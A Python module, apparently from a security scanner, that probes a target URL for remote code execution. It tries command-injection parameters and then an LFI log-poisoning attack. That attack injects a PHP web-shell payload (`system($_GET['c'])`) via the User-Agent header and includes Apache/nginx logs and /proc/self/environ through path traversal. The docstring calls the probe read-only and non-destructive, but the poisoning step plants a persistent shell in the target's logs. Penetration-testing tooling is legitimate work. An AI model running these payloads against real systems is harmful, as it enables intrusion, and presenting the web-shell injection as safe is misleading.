"""Prova ativa e SEGURA de RCE (confirma execução sem impacto).

Tenta provar um RCE/LFI→RCE com um único comando READ-ONLY allowlisted
(whoami/id/uname/dir/ver) e confirma pela ASSINATURA da saída na resposta.
Somente GET/HEAD read-only; nenhum comando destrutivo; respeita o guardrail
(is_safe_proof_command). Se nada executar, retorna 'refuted' honestamente.
"""

from __future__ import annotations

import re

import httpx

from app.services.guardrail_policy import is_safe_proof_command

_TIMEOUT = httpx.Timeout(connect=6.0, read=12.0, write=6.0, pool=6.0)

# Assinaturas que comprovam EXECUÇÃO (não mero eco do input).
_SIGNATURES = [
    ("id", re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+")),          # id (linux)
    ("uname -a", re.compile(r"\bLinux\s+\S+\s+\d+\.\d+")),       # uname -a
    ("ver", re.compile(r"Microsoft Windows \[Version", re.I)),  # ver (win)
    ("dir", re.compile(r"Directory of |<DIR>|Volume Serial Number", re.I)),
    ("whoami", re.compile(r"\b(nt authority\\|iis apppool\\|www-data|apache|nginx|root|daemon)\b", re.I)),
]

# Parâmetros comuns de injeção de comando / LFI (probe bounded).
_CMD_PARAMS = ["cmd", "exec", "command", "c", "run", "ping", "query", "x"]
_LFI_PARAMS = ["file", "page", "include", "path", "doc", "template", "view"]
_LOG_PATHS = [
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "/proc/self/environ",
]


def _detect(text: str) -> tuple[str, str] | None:
    """Retorna (comando, trecho) se alguma assinatura de execução casar."""
    for cmd, pat in _SIGNATURES:
        m = pat.search(text or "")
        if m:
            start = max(0, m.start() - 20)
            return cmd, text[start:m.end() + 60]
    return None


def verify_rce(target_url: str, proof_cmd: str = "id", os_hint: str = "linux") -> dict:
    """Tenta provar RCE no alvo com um comando de prova seguro. Bounded.

    Retorna: confirmed(bool), vector, command, evidence, attempts, note.
    """
    proof_cmd = proof_cmd if is_safe_proof_command(proof_cmd) else "id"
    win_cmd = "ver"
    result = {
        "target": target_url, "confirmed": False, "vector": None,
        "command": proof_cmd, "evidence": None, "attempts": 0,
        "note": None, "safe_proof": True,
    }
    base = target_url if str(target_url).startswith("http") else f"https://{target_url}"
    base = base.rstrip("/")

    try:
        with httpx.Client(timeout=_TIMEOUT, follow_redirects=True, verify=False,
                          headers={"User-Agent": "Mozilla/5.0 (easm-rce-proof)"}) as c:
            # ── Vetor 1: parâmetro de comando direto (?cmd=id) ────────────────
            for param in _CMD_PARAMS:
                for cmd in (proof_cmd, win_cmd):
                    if not is_safe_proof_command(cmd):
                        continue
                    url = f"{base}/?{param}={cmd}"
                    result["attempts"] += 1
                    try:
                        r = c.get(url)
                        hit = _detect(r.text)
                        if hit:
                            result.update({"confirmed": True, "vector": f"cmd-param:{param}",
                                           "command": hit[0], "evidence": hit[1][:300]})
                            return result
                    except Exception:
                        pass

            # ── Vetor 2: LFI → log poisoning → RCE ────────────────────────────
            # Passo A: envena o log com payload PHP que executa $_GET['c'].
            poison = "<?php system($_GET['c']); ?>"
            try:
                c.get(base + "/", headers={"User-Agent": poison})
            except Exception:
                pass
            # Passo B: inclui o log via LFI com c=<comando de prova>.
            for lp in _LFI_PARAMS:
                for logp in _LOG_PATHS:
                    for cmd in (proof_cmd,):
                        url = f"{base}/?{lp}={logp}&c={cmd}"
                        result["attempts"] += 1
                        try:
                            r = c.get(url)
                            hit = _detect(r.text)
                            if hit:
                                result.update({"confirmed": True, "vector": f"lfi-log-poison:{lp}",
                                               "command": hit[0], "evidence": hit[1][:300]})
                                return result
                        except Exception:
                            pass
    except Exception as exc:
        result["note"] = f"erro de conexão: {type(exc).__name__}"
        return result

    result["note"] = ("Nenhum comando executou em %d tentativas — sem ponto de "
                      "injeção alcançável. RCE NÃO comprovado (refutado)." % result["attempts"])
    return result
